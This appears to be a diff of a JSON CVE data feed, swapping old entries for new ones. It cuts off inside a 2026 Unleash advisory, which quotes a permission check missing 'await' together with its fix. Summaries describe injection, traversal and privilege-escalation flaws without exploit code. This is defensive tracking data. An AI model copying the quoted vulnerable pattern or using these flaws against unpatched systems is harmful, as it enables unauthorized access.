Environment\n\n- ToolHive v0.9.3 (macOS desktop app, Docker runtime)\n- Docker Desktop for Mac (host.docker.internal enabled by default)\n- Tested with `docker.io/mcp/filesystem:latest`",
-      "cvssScore": 8.8,
-      "severity": "High",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-284",
-        "name": "Improper Access Control"
-      },
-      "references": [
-        "https://github.com/stacklok/toolhive/security/advisories/GHSA-qg2g-g9w3-m5h8",
-        "https://github.com/stacklok/toolhive-studio/pull/2469",
-        "https://github.com/stacklok/toolhive/pull/5583",
-        "https://github.com/stacklok/toolhive-studio/commit/968182d7f3ee1e55123369e66ad88f82128119b0",
-        "https://github.com/stacklok/toolhive/commit/d8f40cb1599b8bf66657f2dfff15bfbfc236e712"
-      ],
-      "vulnerableProducts": [
-        "github.com/stacklok/toolhive go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0579",
-      "summary": "WorkforceROI Xpede 4.1 allows remote attackers to gain privileges as an Xpede administrator via a direct HTTP request to the /admin/adminproc.asp script, which does not prompt for a password.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-06-18",
+      "published": "2003-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8900.php",
-        "http://www.securityfocus.com/bid/4552",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8900.php"
+        "http://www.securityfocus.com/archive/1/341815",
+        "http://www.securityfocus.com/bid/8857",
+        "http://www.securityfocus.com/archive/1/341815",
+        "http://www.securityfocus.com/bid/8857"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0580",
-      "summary": "WorkforceROI Xpede 4.1 allows remote attackers to obtain the database username via a request to datasource.asp, which leaks the username in a form and allows the attacker to more easily conduct brute force password guessing attacks.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-06-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8902.php",
-        "http://www.securityfocus.com/bid/4553",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8902.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0581",
-      "summary": "WorkforceROI Xpede 4.1 allows remote attackers to execute arbitrary SQL commands and read, modify, or steal credentials from the database via the Qry parameter in the sprc.asp script.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-06-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8903.php",
-        "http://www.securityfocus.com/bid/4555",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8903.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0582",
-      "summary": "WorkforceROI Xpede 4.1 stores temporary expense claim reports in a world-readable and indexable /reports/temp directory, which allows remote attackers to read the reports by accessing the directory.",
+      "id": "CVE-2003-1517",
+      "summary": "cart.pl in Dansie shopping cart allows remote attackers to obtain the installation path via an invalid db parameter, which leaks the path in an error message.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2002-06-18",
+      "published": "2003-12-31",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-200",
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8905.php",
-        "http://www.securityfocus.com/bid/4554",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8905.php"
+        "http://www.securiteam.com/securitynews/6T00T008KG.html",
+        "http://www.securityfocus.com/bid/8860",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/13461",
+        "http://www.securiteam.com/securitynews/6T00T008KG.html",
+        "http://www.securityfocus.com/bid/8860"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0583",
-      "summary": "WorkforceROI Xpede 4.1 uses a small random namespace (5 alphanumeric characters) for temporary expense claim reports in the /reports/temp directory, which allows remote attackers to read the reports via a brute force attack.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-06-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8905.php",
-        "http://www.securityfocus.com/bid/4554",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8905.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0584",
-      "summary": "WorkforceROI Xpede 4.1 allows remote attackers to read user timesheets by modifying the TSN ID parameter to the ts_app_process.asp script, which is easily guessable because it is incremented by 1 for each new timesheet.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-06-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8907.php",
-        "http://www.securityfocus.com/bid/4556",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0273.html",
-        "http://www.iss.net/security_center/static/8907.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0585",
-      "summary": "Unknown vulnerability in ndd for HP-UX 11.11 with certain TRANSPORT patches allows attackers to cause a denial of service.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-06-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/hp/2002-q2/0034.html",
-        "http://www.iss.net/security_center/static/9020.php",
-        "http://www.securityfocus.com/bid/4680",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A5490",
-        "http://archives.neohapsis.com/archives/hp/2002-q2/0034.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0586",
-      "summary": "Format string vulnerability in Ns_PdLog function for the external database driver proxy daemon library (libnspd.a) of AOLServer 3.0 through 3.4.2 allows remote attackers to execute arbitrary code via the Error or Notice parameters.",
+      "id": "CVE-2001-1414",
+      "summary": "The Basic Security Module (BSM) for Solaris 2.5.1, 2.6, 7, and 8 does not log anonymous FTP access, which allows remote attackers to hide their activities, possibly when certain BSM audit files are not present under the FTP root.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2002-06-18",
+      "published": "2001-10-09",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0195.html",
-        "http://sourceforge.net/tracker/index.php?func=detail&aid=533141&group_id=3152&atid=303152",
-        "http://www.iss.net/security_center/static/8860.php",
-        "http://www.securityfocus.com/bid/4535",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0195.html"
+        "http://sunsolve.sun.com/search/document.do?assetkey=1-26-40521-1",
+        "http://www.securityfocus.com/bid/7396",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11841",
+        "http://sunsolve.sun.com/search/document.do?assetkey=1-26-40521-1",
+        "http://www.securityfocus.com/bid/7396"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0587",
-      "summary": "Buffer overflow in Ns_PdLog function for the external database driver proxy daemon library (libnspd.a) of AOLServer 3.0 through 3.4.2 allows remote attackers to cause a denial of service or execute arbitrary code via the Error or Notice parameters.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-06-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0195.html",
-        "http://cvs.sourceforge.net/cgi-bin/viewcvs.cgi/aolserver/aolserver/nspd/log.c.diff?r1=1.4&r2=1.4.6.1",
-        "http://sourceforge.net/tracker/index.php?func=detail&aid=533141&group_id=3152&atid=303152",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0195.html",
-        "http://cvs.sourceforge.net/cgi-bin/viewcvs.cgi/aolserver/aolserver/nspd/log.c.diff?r1=1.4&r2=1.4.6.1"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0588",
-      "summary": "PVote before 1.9 does not authenticate users for restricted operations, which allows remote attackers to add or delete polls by modifying parameters to (1) add.php or (2) del.php.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-06-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/1/268231",
-        "http://orbit-net.net:8001/php/pvote/",
-        "http://www.iss.net/security_center/static/8877.php",
-        "http://www.securityfocus.com/bid/4540",
-        "http://online.securityfocus.com/archive/1/268231"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0589",
-      "summary": "PVote before 1.9 allows remote attackers to change the administrative password and gain privileges by directly calling ch_info.php with the newpass and confirm parameters both set to the new password.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-06-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://online.securityfocus.com/archive/1/268231",
-        "http://orbit-net.net:8001/php/pvote/",
-        "http://www.iss.net/security_center/static/8878.php",
-        "http://www.securityfocus.com/bid/4541",
-        "http://online.securityfocus.com/archive/1/268231"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0590",
-      "summary": "Cross-site scripting (CSS) vulnerability in IcrediBB 1.1 Beta allows remote attackers to execute arbitrary script and steal cookies as other IcrediBB users via the (1) title or (2) body of posts.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-06-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0263.html",
-        "http://www.iss.net/security_center/static/8879.php",
-        "http://www.securityfocus.com/bid/4548",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0263.html",
-        "http://www.iss.net/security_center/static/8879.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0234",
-      "summary": "The default configuration of Cobalt RaQ2 and RaQ3 as specified in access.conf allows remote attackers to view sensitive contents of a .htaccess file.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-03-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/1083",
-        "http://www.securityfocus.com/templates/advisory.html?id=2150",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=20000330220757.28456.qmail%40securityfocus.com",
-        "http://www.securityfocus.com/bid/1083",
-        "http://www.securityfocus.com/templates/advisory.html?id=2150"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1812",
-      "summary": "Buffer overflow in gdam123 0.933 and 0.942 allows local users to execute arbitrary code via a long filename parameter.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.iss.net/security_center/static/9991.php",
-        "http://www.netric.org/advisories/netric-adv007.txt",
-        "http://www.securiteam.com/exploits/5CP0Y0080G.html",
-        "http://www.securityfocus.com/bid/5578",
-        "http://www.iss.net/security_center/static/9991.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1813",
-      "summary": "Directory traversal vulnerability in AOL Instant Messenger (AIM) 4.8.2790 allows remote attackers to execute arbitrary programs by specifying the program in the href attribute of a link.",
-      "cvssScore": 2.6,
-      "severity": "Low",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0319.html",
-        "http://www.iss.net/security_center/static/10441.php",
-        "http://www.securityfocus.com/bid/6027",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0319.html",
-        "http://www.iss.net/security_center/static/10441.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0247",
-      "summary": "Unknown vulnerability in Generic-NQS (GNQS) allows local users to gain root privileges.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2000-03-22",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-00:13.generic-nqs.asc",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-03/0236.html",
-        "http://ftp.gnqs.org/pub/gnqs/source/by-version-number/v3.50/Generic-NQS-3.50.8-ChangeLog.txt",
-        "http://www.securityfocus.com/bid/1842",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4306"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0227",
-      "summary": "The Linux 2.2.x kernel does not restrict the number of Unix domain sockets as defined by the wmem_max parameter, which allows local users to cause a denial of service by requesting a large number of sockets.",
+      "id": "CVE-2001-1098",
+      "summary": "Cisco PIX firewall manager (PFM) 4.3(2)g logs the enable password in plaintext in the pfm.log file, which could allow local users to obtain the password by reading the file.",
       "cvssScore": 2.1,
       "severity": "Low",
-      "published": "2000-03-23",
+      "published": "2001-10-10",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-03/0254.html",
-        "http://marc.info/?l=bugtraq&m=95421263519558&w=2",
-        "http://www.securityfocus.com/bid/1072",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4186",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-03/0254.html"
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0071.html",
+        "http://www.kb.cert.org/vuls/id/639507",
+        "http://www.securityfocus.com/bid/3419",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7265",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0071.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0242",
-      "summary": "WindMail allows remote attackers to read arbitrary files or execute commands via shell metacharacters.",
+      "id": "CVE-2001-1227",
+      "summary": "Zope before 2.2.4 allows partially trusted users to bypass security controls for certain methods by accessing the methods through the fmt attribute of dtml-var tags.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-10-10",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.linux-mandrake.com/en/security/2001/MDKSA-2001-080.php3",
+        "http://www.redhat.com/support/errata/RHSA-2001-072.html",
+        "http://www.redhat.com/support/errata/RHSA-2001-115.html",
+        "http://www.securityfocus.com/bid/3425",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7271"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1278",
+      "summary": "Zope before 2.2.4 allows partially trusted users to bypass security controls for certain methods by accessing the methods through the fmt attribute of dtml-var tags.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-10-10",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.linux-mandrake.com/en/security/2001/MDKSA-2001-080.php3",
+        "http://www.redhat.com/support/errata/RHSA-2001-115.html",
+        "http://www.securityfocus.com/bid/3425",
+        "http://www.linux-mandrake.com/en/security/2001/MDKSA-2001-080.php3",
+        "http://www.redhat.com/support/errata/RHSA-2001-115.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1423",
+      "summary": "Advanced Poll before 1.61, when using a flat file database, allows remote attackers to gain privileges by setting the logged_in parameter.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-10-10",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://securitytracker.com/id?1002516",
+        "http://www.kb.cert.org/vuls/id/140723",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7861",
+        "http://securitytracker.com/id?1002516",
+        "http://www.kb.cert.org/vuls/id/140723"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1280",
+      "summary": "POP3 Server for Ipswitch IMail 7.04 and earlier generates different responses to valid and invalid user names, which allows remote attackers to determine users on the system.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2000-03-25",
+      "published": "2001-10-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/bid/1073",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&date=2000-03-22&msg=20000325224146.6839.qmail%40securityfocus.com",
-        "http://www.securityfocus.com/bid/1073",
-        "http://www.securityfocus.com/templates/archive.pike?list=1&date=2000-03-22&msg=20000325224146.6839.qmail%40securityfocus.com"
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0076.html",
+        "http://www.ipswitch.com/Support/IMail/news.html",
+        "http://www.securityfocus.com/bid/3424",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0076.html",
+        "http://www.ipswitch.com/Support/IMail/news.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0828",
-      "summary": "UnixWare pkg commands such as pkginfo, pkgcat, and pkgparam allow local users to read arbitrary files via the dacread permission.",
+      "id": "CVE-2001-1281",
+      "summary": "Web Messaging Server for Ipswitch IMail 7.04 and earlier allows remote authenticated users to change information for other users by modifying the olduser parameter in the \"Change User Information\" web form.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-10-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0076.html",
+        "http://www.ipswitch.com/Support/IMail/news.html",
+        "http://www.securityfocus.com/bid/3429",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0076.html",
+        "http://www.ipswitch.com/Support/IMail/news.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1282",
+      "summary": "Ipswitch IMail 7.04 and earlier records the physical path of attachments in an e-mail message header, which could allow remote attackers to obtain potentially sensitive configuration information.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-10-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0082.html",
+        "http://www.ipswitch.com/Support/IMail/news.html",
+        "http://www.securityfocus.com/bid/3426",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0082.html",
+        "http://www.ipswitch.com/Support/IMail/news.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1283",
+      "summary": "The webmail interface for Ipswitch IMail 7.04 and earlier allows remote authenticated users to cause a denial of service (crash) via a mailbox name that contains a large number of . (dot) or other characters to programs such as (1) readmail.cgi or (2) printmail.cgi, possibly due to a buffer overflow that may allow execution of arbitrary code.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-10-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0082.html",
+        "http://www.ipswitch.com/Support/IMail/news.html",
+        "http://www.securityfocus.com/bid/3427",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0082.html",
+        "http://www.ipswitch.com/Support/IMail/news.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1284",
+      "summary": "Ipswitch IMail 7.04 and earlier uses predictable session IDs for authentication, which allows remote attackers to hijack sessions of other users.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-10-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0082.html",
+        "http://www.ipswitch.com/Support/IMail/news.html",
+        "http://www.securityfocus.com/bid/3428",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0082.html",
+        "http://www.ipswitch.com/Support/IMail/news.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1285",
+      "summary": "Directory traversal vulnerability in readmail.cgi for Ipswitch IMail 7.04 and earlier allows remote attackers to access the mailboxes of other users via a .. (dot dot) in the mbx parameter.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-10-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0082.html",
+        "http://www.ipswitch.com/Support/IMail/news.html",
+        "http://www.securityfocus.com/bid/3432",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0082.html",
+        "http://www.ipswitch.com/Support/IMail/news.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1286",
+      "summary": "Ipswitch IMail 7.04 and earlier stores a user's session ID in a URL, which could allow remote attackers to hijack sessions by obtaining the URL, e.g. via an HTML email that causes the Referrer to be sent to a URL under the attacker's control.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-10-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0082.html",
+        "http://online.securityfocus.com/archive/1/261096",
+        "http://www.ipswitch.com/Support/IMail/news.html",
+        "http://www.securityfocus.com/bid/3432",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-10/0082.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0044",
+      "summary": "GNU Enscript 1.6.1 and earlier allows local users to overwrite arbitrary files of the Enscript user via a symlink attack on temporary files.",
       "cvssScore": 3.6,
       "severity": "Low",
-      "published": "1999-12-02",
+      "published": "2002-01-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/bid/853",
-        "http://www.securityfocus.com/bid/853"
+        "http://www.debian.org/security/2002/dsa-105",
+        "http://www.linux-mandrake.com/en/security/2002/MDKSA-2002-010.php3",
+        "http://www.redhat.com/support/errata/RHSA-2002-012.html",
+        "http://www.securityfocus.com/advisories/3818",
+        "http://www.securityfocus.com/bid/3920"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0850",
-      "summary": "The default permissions for Endymion MailMan allow local users to read email or modify files.",
-      "cvssScore": 3.6,
-      "severity": "Low",
-      "published": "1999-12-02",
+      "id": "CVE-2002-0045",
+      "summary": "slapd in OpenLDAP 2.0 through 2.0.19 allows local users, and anonymous users before 2.0.8, to conduct a \"replace\" action on access controls without any values, which causes OpenLDAP to delete non-mandatory attributes that would otherwise be protected by ACLs.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-01-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/bid/845",
-        "http://www.securityfocus.com/bid/845"
+        "ftp://ftp.caldera.com/pub/security/OpenLinux/CSSA-2002-001.0.txt",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000459",
+        "http://frontal2.mandriva.com/security/advisories?name=MDKSA-2002:013",
+        "http://www.openldap.org/lists/openldap-announce/200201/msg00002.html",
+        "http://www.osvdb.org/5395"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0852",
-      "summary": "IBM WebSphere sets permissions that allow a local user to modify a deinstallation script or its data files stored in /usr/bin.",
+      "id": "CVE-2003-0156",
+      "summary": "Directory traversal vulnerability in Cross-Referencing Linux (LXR) allows remote attackers to read arbitrary files via .. (dot dot) sequences in the v parameter.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2003-03-24",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=104739747222492&w=2",
+        "http://www.debian.org/security/2003/dsa-264",
+        "http://www.securityfocus.com/bid/7062",
+        "http://marc.info/?l=bugtraq&m=104739747222492&w=2",
+        "http://www.debian.org/security/2003/dsa-264"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0157",
+      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: CVE-2003-0138.  Reason: This candidate is a reservation duplicate of CVE-2003-0138 due to incomplete coordination.  Notes: All CVE users should reference CVE-2003-0138 instead of this candidate.  All references and descriptions in this candidate have been removed to prevent accidental usage",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2003-03-24",
+      "modified": null,
+      "cwe": null,
+      "references": [],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0158",
+      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: CVE-2003-0139.  Reason: This candidate is a reservation duplicate of CVE-2003-0139 due to incomplete coordination.  Notes: All CVE users should reference CVE-2003-0139 instead of this candidate.  All references and descriptions in this candidate have been removed to prevent accidental usage",
+      "cvssScore": null,
+      "severity": "Unknown",
+      "published": "2003-03-24",
+      "modified": null,
+      "cwe": null,
+      "references": [],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0028",
+      "summary": "Integer overflow in the xdrmem_getbytes() function, and possibly other functions, of XDR (external data representation) libraries derived from SunRPC, including libnsl, libc, glibc, and dietlibc, allows remote attackers to execute arbitrary code via certain integer values in length fields, a different vulnerability than CVE-2002-0391.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-03-25",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2003-008.txt.asc",
+        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0140.html",
+        "http://marc.info/?l=bugtraq&m=104810574423662&w=2",
+        "http://marc.info/?l=bugtraq&m=104811415301340&w=2",
+        "http://marc.info/?l=bugtraq&m=104860855114117&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1074",
+      "summary": "Unknown vulnerability in newtask for Solaris 9 allows local users to gain root privileges.",
       "cvssScore": 7.2,
       "severity": "High",
-      "published": "1999-12-02",
+      "published": "2003-03-28",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/bid/844",
-        "http://www.securityfocus.com/bid/844"
+        "http://secunia.com/advisories/8454/",
+        "http://sunsolve.sun.com/search/document.do?assetkey=1-26-52111-1",
+        "http://www.ciac.org/ciac/bulletins/n-069.shtml",
+        "http://www.securityfocus.com/bid/7252",
+        "http://www.securitytracker.com/id?1006411"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0858",
-      "summary": "Internet Explorer 5 allows a remote attacker to modify the IE client's proxy configuration via a malicious Web Proxy Auto-Discovery (WPAD) server.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-12-02",
-      "modified": null,
-      "cwe": "CWE-16",
-      "references": [
-        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ247333",
-        "http://www.securityfocus.com/bid/846",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-054",
-        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ247333",
-        "http://www.securityfocus.com/bid/846"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0862",
-      "summary": "Insecure directory permissions in RPM distribution for PostgreSQL allows local users to gain privileges by reading a plaintext password file.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "1999-12-02",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0862",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0862"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77426",
-      "summary": "## Summary\n\nMultiple authorization vulnerabilities in Unleash admin API, including a critical missing `await` that completely bypasses a permission check.\n\n## Vulnerability 1: Missing `await` on Permission Check (HIGH)\n\n**File:** `src/lib/features/segment/segment-controller.ts` (line 345)\n\n`POST /api/admin/segments/strategies` has `permission: NONE` at the route level. The handler performs its own check via `this.accessService.hasPermission()`, but **omits the `await` keyword**. Since `hasPermission()` is async (returns `Promise<boolean>`), the variable always receives a truthy Promise object. The `if (!hasFeatureStrategyPermission)` check never triggers.\n\n```typescript\n// BUG: missing await - hasPermission() returns Promise<boolean>\nconst hasFeatureStrategyPermission = this.accessService.hasPermission(\n    req.user, UPDATE_FEATURE_STRATEGY, projectId, environmentId,\n);\nif (!hasFeatureStrategyPermission) { // Always false - Promise is truthy!\n    res.status(403).send();\n    return;\n}\n```\n\n**Impact:** Any authenticated user can modify segment assignments on ANY strategy across ALL projects.\n\n**Fix:** Add `await`: `const hasFeatureStrategyPermission = await this.accessService.hasPermission(...)`\n\n## Vulnerability 2: Cross-Project Variant Read (MEDIUM)\n\n**File:** `src/lib/routes/admin-api/project/variants.ts` (line 213-223)\n\n`GET /api/admin/projects/:projectId/features/:featureName/environments/:environment/variants` completely ignores `projectId`. `getVariantsOnEnv()` only uses `featureName` and `environment`.\n\n**Impact:** Any authenticated user can read variant configs (names, weights, payloads) from any project.\n\n## Vulnerability 3: Cross-Project Strategy Read (MEDIUM)\n\n**File:** 